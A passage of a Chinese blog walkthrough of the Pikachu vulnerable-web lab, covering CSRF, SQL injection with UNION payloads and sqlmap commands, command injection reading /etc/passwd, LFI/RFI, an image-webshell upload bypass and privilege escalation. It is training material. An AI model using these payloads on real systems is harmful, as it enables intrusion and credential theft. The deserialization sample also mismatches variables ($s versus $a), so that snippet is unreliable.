+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image29.png"></p>
+<ol start="5">
+<li>修改 PoC 中的目标参数后复制链接</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image30.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image31.png"></p>
+<ol start="6">
+<li>访问构造好的链接后，发现用户信息已被悄悄修改 ✅</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image32.png"></p>
+<hr>
+<h3 id="2-2-CSRF（POST）"><a href="#2-2-CSRF（POST）" class="headerlink" title="2.2 CSRF（POST）"></a>2.2 CSRF（POST）</h3><p><strong>📖 概念：</strong> 与 GET 型 CSRF 原理相同，区别在于请求使用 POST 方式发送，需要构造一个隐藏表单页面自动提交。</p>
+<hr>
+<h3 id="2-3-CSRF-Token"><a href="#2-3-CSRF-Token" class="headerlink" title="2.3 CSRF Token"></a>2.3 CSRF Token</h3><p><strong>📖 概念：</strong> 添加了随机 Token 验证，理论上无法直接伪造请求。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image33.png"></p>
+<p><strong>🔍 查看源代码：</strong> 发现 Token 存储在前端 HTML 中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image34.png"></p>
+<blockquote>
+<p>💡 <strong>绕过思路：</strong> 此处可配合 <strong>XSS 漏洞</strong>，先通过 XSS 读取页面中的 Token 值，再携带 Token 构造 CSRF 请求，实现完整攻击链：<code>XSS + CSRF</code>。</p>
+</blockquote>
+<hr>
+<h2 id="三、SQL-注入"><a href="#三、SQL-注入" class="headerlink" title="三、SQL 注入"></a>三、SQL 注入</h2><blockquote>
+<p>💉 SQL 注入是指攻击者将恶意 SQL 语句插入到输入参数中，操控后端数据库执行非预期的查询。</p>
+</blockquote>
+<hr>
+<h3 id="3-1-数字型注入"><a href="#3-1-数字型注入" class="headerlink" title="3.1 数字型注入"></a>3.1 数字型注入</h3><p><strong>🔍 步骤：</strong></p>
+<ol>
+<li>输入数字，页面正常显示</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image35.png"></p>
+<ol start="2">
+<li>输入单引号 <code>&#39;</code>，页面报错 → 确认存在注入点</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image36.png"></p>
+<ol start="3">
+<li>使用 <code>ORDER BY</code> 探测列数，到 <code>2</code> 不报错，说明有 <strong>2 列输出</strong></li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image37.png"></p>
+<ol start="4">
+<li>使用联合注入查询数据库信息</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image38.png"></p>
+<p><strong>💣 查表名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image39.png"></p>
+<p><strong>💣 查列名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image40.png"></p>
+<p><strong>💣 查数据：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(username),group_concat(password) <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image41.png"></p>
+<ol start="5">
+<li>密码经过 MD5 加密，使用在线工具解密：<a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e10adc3949ba59abbe56e057f20f883e → 123456</span><br><span class="line">670b14728ad9902aecba32e22fa4f6bd → 123456</span><br><span class="line">e99a18c428cb38d5f260853678922e03 → abc123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image42.png"></p>
+<hr>
+<h3 id="3-2-字符型注入"><a href="#3-2-字符型注入" class="headerlink" title="3.2 字符型注入"></a>3.2 字符型注入</h3><p><strong>🔍 思路：</strong> 参数被单引号包裹，需要用 <code>&#39;</code> 闭合原有引号再注入。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image43.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image44.png"></p>
+<p><strong>💣 Payload：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image45.png"></p>
+<hr>
+<h3 id="3-3-搜索型注入"><a href="#3-3-搜索型注入" class="headerlink" title="3.3 搜索型注入"></a>3.3 搜索型注入</h3><p><strong>📖 概念：</strong> 后端 SQL 使用 <code>LIKE &#39;%$name%&#39;</code> 进行模糊查询，存在注入风险。</p>
+<p>使用 SQLMap 自动检测：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://pikachu/vul/sqli/sqli_search.php?name=1&amp;submit=%E6%90%9C%E7%B4%A2&quot;</span> --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image46.png"></p>
+<hr>
+<h3 id="3-4-X-型注入"><a href="#3-4-X-型注入" class="headerlink" title="3.4 X 型注入"></a>3.4 X 型注入</h3><p><strong>📖 概念：</strong> SQL 语句结构为 <code>SELECT * FROM users WHERE (id=&#39;$id&#39;)</code>，参数被括号和引号包裹。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://pikachu/vul/sqli/sqli_x.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image47.png"></p>
+<hr>
+<h3 id="3-5-INSERT-UPDATE-注入"><a href="#3-5-INSERT-UPDATE-注入" class="headerlink" title="3.5 INSERT &#x2F; UPDATE 注入"></a>3.5 INSERT &#x2F; UPDATE 注入</h3><p><strong>🔍 思路：</strong> 注入点位于 INSERT 或 UPDATE 语句中，建议将请求包保存为文件，再用 SQLMap 发包。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\Backup\桌面\sql.txt --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image48.png"></p>
+<hr>
+<h3 id="3-6-DELETE-注入"><a href="#3-6-DELETE-注入" class="headerlink" title="3.6 DELETE 注入"></a>3.6 DELETE 注入</h3><p><strong>🔍 思路：</strong> 注入点位于 DELETE 语句中，通常通过 ID 参数传入。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image49.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image50.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 SQLMap 检测</span></span><br><span class="line">python sqlmap.py -r sql.txt --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image51.png"></p>
+<hr>
+<h3 id="3-7-HTTP-头注入"><a href="#3-7-HTTP-头注入" class="headerlink" title="3.7 HTTP 头注入"></a>3.7 HTTP 头注入</h3><p><strong>📖 概念：</strong> 注入点不在 URL 参数中，而是在 HTTP 请求头（如 <code>User-Agent</code>、<code>X-Forwarded-For</code>、<code>Cookie</code> 等）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image52.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image53.png"></p>
+<blockquote>
+<p>⚠️ 注意识别正确的包，登录包不是目标，要找<strong>带有 UA 信息的业务包</strong>。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image54.png"></p>
+<p>这个才是目标包 👇</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image55.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image56.png"></p>
+<p>这是<strong>报错注入</strong>类型：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image57.png"></p>
+<hr>
+<h3 id="3-8-基于-Boolean-的盲注"><a href="#3-8-基于-Boolean-的盲注" class="headerlink" title="3.8 基于 Boolean 的盲注"></a>3.8 基于 Boolean 的盲注</h3><p><strong>📖 概念：</strong> 页面不返回具体数据，只通过 True&#x2F;False 的响应差异来逐位猜解数据。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image58.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;目标URL&quot;</span> --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image59.png"></p>
+<hr>
+<h3 id="3-9-基于时间的盲注"><a href="#3-9-基于时间的盲注" class="headerlink" title="3.9 基于时间的盲注"></a>3.9 基于时间的盲注</h3><p><strong>📖 概念：</strong> 注入后通过 <code>sleep()</code> 函数造成响应延迟，根据响应时间判断条件真假，逐步提取数据。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image60.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;目标URL&quot;</span> --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image61.png"></p>
+<hr>
+<h3 id="3-10-宽字节注入（Wide-Byte）"><a href="#3-10-宽字节注入（Wide-Byte）" class="headerlink" title="3.10 宽字节注入（Wide Byte）"></a>3.10 宽字节注入（Wide Byte）</h3><p><strong>📖 概念：</strong> 宽字节注入是针对<strong>字符编码过滤</strong>的绕过技术。当后端使用 GBK&#x2F;GB2312 编码且对单引号用 <code>\</code> 转义时，通过在单引号前插入 <code>%df</code>，使 <code>%df\</code> 被合并解析为一个合法的 GBK 汉字，从而”吃掉”反斜杠，让单引号逃逸。</p>
+<p><strong>💣 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1%df&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image62.png"></p>
+<hr>
+<h2 id="四、RCE-远程代码执行"><a href="#四、RCE-远程代码执行" class="headerlink" title="四、RCE 远程代码执行"></a>四、RCE 远程代码执行</h2><blockquote>
+<p>⚡ RCE（Remote Code Execution）是危害最高的漏洞类型之一，攻击者可直接在服务器上执行任意命令或代码。</p>
+</blockquote>
+<hr>
+<h3 id="4-1-exec-“ping”"><a href="#4-1-exec-“ping”" class="headerlink" title="4.1 exec “ping”"></a>4.1 exec “ping”</h3><p><strong>📖 概念：</strong> 该功能通过系统调用执行 <code>ping</code> 命令，可利用<strong>管道符</strong>拼接执行额外命令。</p>
+<p><strong>💣 管道命令注入示例：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | <span class="built_in">whoami</span></span><br><span class="line">127.0.0.1 | <span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image63.png"></p>
+<hr>
+<h3 id="4-2-exec-“eval”"><a href="#4-2-exec-“eval”" class="headerlink" title="4.2 exec “eval”"></a>4.2 exec “eval”</h3><p><strong>📖 概念：</strong> 该功能直接 <code>eval()</code> 执行用户输入的 PHP 代码，危害极大。</p>
+<p><strong>💣 Payload：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
+
+<p>直接执行，页面返回完整 phpinfo 信息 ✅</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image64.png"></p>
+<hr>
+<h2 id="五、文件操作漏洞"><a href="#五、文件操作漏洞" class="headerlink" title="五、文件操作漏洞"></a>五、文件操作漏洞</h2><hr>
+<h3 id="5-1-本地文件包含（LFI）"><a href="#5-1-本地文件包含（LFI）" class="headerlink" title="5.1 本地文件包含（LFI）"></a>5.1 本地文件包含（LFI）</h3><p><strong>📖 概念：</strong> 服务端通过 <code>include()</code> 等函数动态加载文件，若参数可控且未过滤路径穿越符，攻击者可读取任意文件。</p>
+<p><strong>🔍 观察 URL 参数：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/fileinclude/fi_local.php?filename=file5.php&amp;submit=提交</span><br></pre></td></tr></table></figure>
+
+<p><strong>💣 构造路径穿越：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/fileinclude/fi_local.php?filename=../../../../../../1.php&amp;submit=提交</span><br></pre></td></tr></table></figure>
+
+<p>预先在目标路径写入如下文件 <code>1.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image65.png"></p>
+<hr>
+<h3 id="5-2-远程文件包含（RFI）"><a href="#5-2-远程文件包含（RFI）" class="headerlink" title="5.2 远程文件包含（RFI）"></a>5.2 远程文件包含（RFI）</h3><p><strong>📖 概念：</strong> 若服务端 PHP 配置开启了 <code>allow_url_include</code>，可以包含远程 URL 指向的恶意文件。</p>
+<p><strong>💣 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/fileinclude/fi_remote.php?filename=http://baidu.com&amp;submit=提交</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image66.png"></p>
+<blockquote>
+<p>💡 实战中可将 <code>filename</code> 参数指向包含 Webshell 的远程服务器，获取权限。</p>
+</blockquote>
+<hr>
+<h3 id="5-3-不安全的文件下载"><a href="#5-3-不安全的文件下载" class="headerlink" title="5.3 不安全的文件下载"></a>5.3 不安全的文件下载</h3><p><strong>📖 概念：</strong> 文件下载接口的 <code>filename</code> 参数未过滤，可通过路径穿越读取任意文件。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image67.png"></p>
+<p><strong>💣 构造路径穿越下载源码：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsafedownload/execdownload.php?filename=../../../index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image68.png"></p>
+<hr>
+<h3 id="5-4-文件上传-—-客户端校验绕过"><a href="#5-4-文件上传-—-客户端校验绕过" class="headerlink" title="5.4 文件上传 — 客户端校验绕过"></a>5.4 文件上传 — 客户端校验绕过</h3><p><strong>📖 概念：</strong> 文件类型校验仅在前端 JavaScript 中完成，禁用 JS 即可绕过。</p>
+<p><strong>🔍 查看源代码，确认是前端检测：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image69.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image70.png"></p>
+<p><strong>🔍 步骤：</strong></p>
+<ol>
+<li>在浏览器中禁用 JavaScript</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image71.png"></p>
+<ol start="2">
+<li>再次上传 <code>.php</code> 文件，已无校验限制</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image72.png"></p>
+<ol start="3">
+<li>访问上传路径，执行成功 ✅</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/unsafeupload/uploads/1.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image73.png"></p>
+<hr>
+<h3 id="5-5-文件上传-—-服务端校验绕过"><a href="#5-5-文件上传-—-服务端校验绕过" class="headerlink" title="5.5 文件上传 — 服务端校验绕过"></a>5.5 文件上传 — 服务端校验绕过</h3><h4 id="MIME-类型检测绕过"><a href="#MIME-类型检测绕过" class="headerlink" title="MIME 类型检测绕过"></a>MIME 类型检测绕过</h4><p><strong>📖 概念：</strong> 服务端检测 <code>Content-Type</code> 字段，在 Burp Suite 中将其修改为 <code>image/png</code> 即可绕过。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image74.png"></p>
+<h4 id="getimagesize-图片头检测绕过"><a href="#getimagesize-图片头检测绕过" class="headerlink" title="getimagesize() 图片头检测绕过"></a>getimagesize() 图片头检测绕过</h4><p><strong>📖 概念：</strong> <code>getimagesize()</code> 通过读取文件头来判断是否是合法图片，可制作<strong>图片马</strong>（在图片文件末尾附加 PHP 代码）来绕过。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 制作图片马</span></span><br><span class="line">copy normal.png /b + shell.php /a webshell.png</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image75.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image76.png"></p>
+<blockquote>
+<p>⚠️ 注意：上传后文件后缀为 <code>.png</code>，无法直接用工具连接 Webshell。需结合<strong>文件包含漏洞</strong>，通过包含图片马来触发执行。</p>
+</blockquote>
+<hr>
+<h2 id="六、越权漏洞"><a href="#六、越权漏洞" class="headerlink" title="六、越权漏洞"></a>六、越权漏洞</h2><blockquote>
+<p>🔑 越权漏洞是指用户能够访问或操作超出其权限范围的数据或功能。</p>
+</blockquote>
+<hr>
+<h3 id="6-1-水平越权"><a href="#6-1-水平越权" class="headerlink" title="6.1 水平越权"></a>6.1 水平越权</h3><p><strong>📖 概念：</strong> 同等权限的用户间互相访问对方数据。（如用户A能查看用户B的信息）</p>
+<p><strong>🔍 步骤：</strong></p>
+<ol>
+<li>登录账号，查看个人信息</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image77.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image78.png"></p>
+<ol start="2">
+<li>观察 URL 参数：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=点击查看个人信息</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>直接修改 <code>username</code> 参数为其他用户名，即可越权访问 ✅</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=点击查看个人信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image79.png"></p>
+<hr>
+<h3 id="6-2-垂直越权"><a href="#6-2-垂直越权" class="headerlink" title="6.2 垂直越权"></a>6.2 垂直越权</h3><p><strong>📖 概念：</strong> 低权限用户访问高权限用户才能使用的功能。（如普通用户访问管理员接口）</p>
+<p><strong>🔍 步骤：</strong></p>
+<ol>
+<li>分别登录普通用户 <code>pikachu</code> 和管理员 <code>Admin</code>，对比页面差异</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image80.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image81.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image82.png"></p>
+<ol start="2">
+<li>管理员点击”添加用户”时，URL 为：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>切换回 <code>pikachu</code> 普通用户的 Cookie，直接访问该 URL，成功操作管理员功能 ✅</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image83.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image84.png"></p>
+<hr>
+<h2 id="七、目录遍历"><a href="#七、目录遍历" class="headerlink" title="七、目录遍历"></a>七、目录遍历</h2><p><strong>📖 概念：</strong> 服务端接受用户控制的文件路径参数，未作充分限制，攻击者可通过 <code>../</code> 跨越目录访问任意文件。</p>
+<p><strong>🔍 观察 URL：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/dir/dir_list.php?title=jarheads.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>💣 构造路径穿越：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pikachu/vul/dir/dir_list.php?title=../../../../../../1.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image85.png"></p>
+<hr>
+<h2 id="八、敏感信息泄露"><a href="#八、敏感信息泄露" class="headerlink" title="八、敏感信息泄露"></a>八、敏感信息泄露</h2><p><strong>📖 概念：</strong> 应用程序无意间将敏感信息暴露在前端页面（如 HTML 注释、JS 文件、报错信息等）。</p>
+<p><strong>🔍 直接查看页面源代码即可发现：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image86.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image87.png"></p>
+<hr>
+<h2 id="九、PHP-反序列化漏洞"><a href="#九、PHP-反序列化漏洞" class="headerlink" title="九、PHP 反序列化漏洞"></a>九、PHP 反序列化漏洞</h2><p><strong>📖 概念：</strong> 当反序列化的内容可被用户控制，且后端使用了危险的魔法函数时，就会产生安全漏洞。</p>
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>serialize()</code></td>
+<td>将对象转换为可传输字符串</td>
+</tr>
+<tr>
+<td><code>unserialize()</code></td>
+<td>将字符串还原为对象</td>
+</tr>
+</tbody></table>
+<p><strong>序列化示例：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="comment">// 输出：O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>格式解析：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">│ │   │  │   │    │       │    │</span><br><span class="line">│ │   │  │   │    │       │    └─ 变量值</span><br><span class="line">│ │   │  │   │    │       └─ 变量值长度</span><br><span class="line">│ │   │  │   │    └─ 变量名</span><br><span class="line">│ │   │  │   └─ 变量名长度</span><br><span class="line">│ │   │  └─ 变量数量</span><br><span class="line">│ │   └─ 对象名称</span><br><span class="line">│ └─ 对象名长度</span><br><span class="line">└─ Object</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见魔法函数"><a href="#常见魔法函数" class="headerlink" title="常见魔法函数"></a>常见魔法函数</h3><table>
+<thead>
+<tr>
+<th>魔法函数</th>
+<th>触发时机</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>__construct()</code></td>
+<td>对象创建时</td>
+</tr>
+<tr>
+<td><code>__destruct()</code></td>
+<td>对象销毁时</td>
+</tr>
+<tr>
+<td><code>__toString()</code></td>
+<td>对象被当作字符串使用时</td>
+</tr>
+<tr>
+<td><code>__sleep()</code></td>
+<td>序列化之前</td>
+</tr>
+<tr>
+<td><code>__wakeup()</code></td>
+<td>反序列化之后立即调用</td>
+</tr>
+</tbody></table>
+<h3 id="漏洞利用示例"><a href="#漏洞利用示例" class="headerlink" title="漏洞利用示例"></a>漏洞利用示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;  <span class="comment">// 对象销毁时会执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>💣 Payload 构造脚本：</strong></p>
